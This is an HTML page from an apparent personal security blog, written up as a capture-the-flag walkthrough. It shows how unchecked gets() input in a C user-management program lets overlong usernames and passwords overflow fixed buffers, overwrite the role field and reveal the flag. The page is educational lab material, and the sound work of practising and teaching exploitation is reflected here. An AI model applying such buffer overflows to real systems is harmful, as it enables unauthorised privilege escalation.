@@ -1,0 +1,169 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<?xml-stylesheet href="styl.css" type="text/css" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pl">
+<head>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.0/prism.min.js"></script>
+ <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
+<meta http-equiv="Content-Type" content="application/xhtml+xml; charset=UTF-8" />
+<meta name="keywords" content="personal page, fyqer">
+ <meta name="author" content="Daniel Gałeczka">
+<title>Fyqer_blog</title>
+<link
+  rel="stylesheet"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.0/themes/prism.min.css"
+/>
+<link rel="stylesheet" type="text/css" href="styl.css" />
+<link rel="stylesheet" href="styl.css">
+
+</head>
+<body>
+<div id="yah"></a></div>
+<div id="menu">
+<h2 id="luk">Menu</h2>
+<a href="index.html" class="link">/index</a> </br>
+<a href="index.html" class="link">/thm_writeups</a>
+<a href="index.html" class="link">/ctf_writeups</a>
+<a href="index.html" class="link">/other_writeups</a>
+<a href="About_author.html" class="link">/About_author</a>
+
+<p id="copy">&copy; copyright by ... Daniel Gałeczka</p></div>
+
+
+<div class="content">
+</br>
+</br>
+<p>
+░░░░██╗███╗░░░███╗░█████╗░███╗░░██╗░█████╗░░██████╗░███████╗██████╗░
+░░░██╔╝████╗░████║██╔══██╗████╗░██║██╔══██╗██╔════╝░██╔════╝██╔══██╗
+░░██╔╝░██╔████╔██║███████║██╔██╗██║███████║██║░░██╗░█████╗░░██████╔╝
+░██╔╝░░██║╚██╔╝██║██╔══██║██║╚████║██╔══██║██║░░╚██╗██╔══╝░░██╔══██╗
+██╔╝░░░██║░╚═╝░██║██║░░██║██║░╚███║██║░░██║╚██████╔╝███████╗██║░░██║
+╚═╝░░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚═╝░░╚═╝
+</p>
+<a href="https://time2hack.org/challenges#Manager-14">
+    <div class="link">
+         <p>Link to the challenge</p>
+		 
+			
+    </div>
+</a>
+
+<p> In this challenge we we're given a SSH credentials, after login, in right directory were placed source code and c program. </p>
+
+<img src="walkth/manag1.jpg" width="450" height="150">
+<a href="https://www.onlinegdb.com/t6fnBrhkP">
+    <div class="link">
+         <p>Source code</p>
+    </div>
+</a>
+
+<p>This program allow us to make 3 main actions in the main menu: </p>
+<p>- Add a user</p>
+<p>- Delete user</p>
+<p>- Log in </p>
+<p>Additionally program have a 'role' property, when its 0 it mean you are a 'normal' user and when it's 1 it means that after login we get a flag.
+</p>
+
+
+<pre><code class="language-php">
+struct User
+{
+        char name[100];
+        char pwd[100];
+        enum {admin, regular} role;
+} users[MAX_USERS];
+</pre>
+<p> Name and password of user have 100 length long and usefeull information is that program reads properties from gets method, that makes often vulnerabilities like possibility to overwrite.</p>
+<p>After lot of trying i successfuly overwrite user's password,login and role by write huge strings as a login. </p>
+<pre><code class="language-css">
+Menu:
+1 - Login
+2 - Register
+3 - Delete
+4 - Exit
+Enter number: 2
+Enter new username: x
+Enter new password: x
+Registration completed! You can login now!
+
+Menu:
+1 - Login
+2 - Register
+3 - Delete
+4 - Exit
+Enter number: 2
+Enter new username: y
+Enter new password: y
+Registration completed! You can login now!
+
+Menu:
+1 - Login
+2 - Register
+3 - Delete
+4 - Exit
+Enter number: 2
+Enter new username: z
+Enter new password: z
+Registration completed! You can login now!
+
+Menu:
+1 - Login
+2 - Register
+3 - Delete
+4 - Exit
+Enter number: 3
+Enter username to delete: x
+Confirm password: x
+User has been deleted!
+
+Menu:
+1 - Login
+2 - Register
+3 - Delete
+4 - Exit
+Enter number: 3
+Enter username to delete: y
+Confirm password: y
+User has been deleted!
+
+Menu:
+1 - Login
+2 - Register
+3 - Delete
+4 - Exit
+Enter number: 2
+Enter new username: b
+Enter new password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Registration completed! You can login now!
+
+Menu:
+1 - Login
+2 - Register
+3 - Delete
+4 - Exit
+Enter number: 2
+Enter new username: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Enter new password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Registration completed! You can login now!
+
+Menu:
+1 - Login
+2 - Register
+3 - Delete
+4 - Exit
+Enter number: 1
+Enter username: a
+Enter password: a
+Hello a!
+
+CTF{OverRun!}
+
+
+</pre>
+
+
+</div>
+
+</body>
+</html>
